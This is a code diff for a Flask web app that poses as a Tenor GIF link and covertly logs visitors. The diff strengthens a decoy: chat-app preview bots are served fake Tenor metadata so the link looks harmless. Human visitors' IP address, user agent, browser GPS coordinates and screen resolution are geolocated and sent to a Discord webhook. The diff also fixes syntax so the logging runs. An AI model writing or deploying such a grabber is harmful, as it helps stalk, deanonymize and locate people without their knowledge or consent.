@@ -65,14 +65,26 @@ def index():
     if ip and ',' in ip:
         ip = ip.split(',')[0].strip()
 
-    # Discord Bot Prevention
-    if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"]):
-        return "<html><head><title>Loading Tenor...</title></head><body>Redirecting to media...</body></html>"
+    # Discord Bot Detection & Preview Enhancement
+    if any(bot in user_agent for bot in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot", "LinkedInBot"]):
+        return """
+        <html>
+        <head>
+            <title>Loading Tenor GIF...</title>
+            <meta property="og:title" content="Tenor - Animated GIF">
+            <meta property="og:description" content="Click to view the loading media...">
+            <meta property="og:image" content="https://media.tenor.com/images/307604f3f03b22ed78564f9b8131336a/tenor.gif">
+            <meta property="og:type" content="video.other">
+            <meta name="twitter:card" content="summary_large_image">
+        </head>
+        <body>Redirecting to media...</body>
+        </html>
+        """
 
     import random
     redirect_url = CUSTOM_IMAGE_URL if CUSTOM_IMAGE_URL else random.choice(IMAGES)
 
-    # Serve JS Bridge
+    # Serve JS Bridge (Human Case)
     return f"""
     <html>
     <head>
@@ -140,11 +152,14 @@ def log_endpoint():
         gps = data.get('gps') # lat, lon or None
         
         geo = get_ip_info(ip)
-        send_to_discord(ip, ua, geo, gps_data={{ 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') }} if gps else {{ 'res': data.get('res') }})
+        # FIXED: Dictionary literal syntax
+        gps_data = { 'lat': gps['lat'], 'lon': gps['lon'], 'res': data.get('res') } if gps else { 'res': data.get('res') }
         
-        return {{"status": "ok"}}
-    except:
-        return {{"status": "error"}}, 500
+        send_to_discord(ip, ua, geo, gps_data=gps_data)
+        
+        return {"status": "ok"}
+    except Exception as e:
+        return {"status": "error", "message": str(e)}, 500
 
 if __name__ == '__main__':
     app.run(debug=True)
